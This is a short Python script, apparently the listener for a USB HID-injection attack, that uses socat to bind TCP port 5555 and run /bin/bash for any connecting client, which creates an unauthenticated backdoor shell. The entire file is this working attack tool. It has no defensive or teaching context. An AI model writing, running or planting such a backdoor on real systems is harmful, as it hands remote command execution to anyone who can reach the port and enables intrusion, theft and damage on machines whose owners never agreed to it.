#!/usr/bin/env python3

import subprocess
import time

def start_backdoor_listener(port=5555):
    print(f"[+] Listening for HID backdoor on port {port} using socat")
    try:
        subprocess.run(["socat", f"TCP-LISTEN:{port},reuseaddr", "EXEC:/bin/bash"])
    except KeyboardInterrupt:
        print("\n[!] HID backdoor listener stopped.")

if __name__ == "__main__":
    start_backdoor_listener()
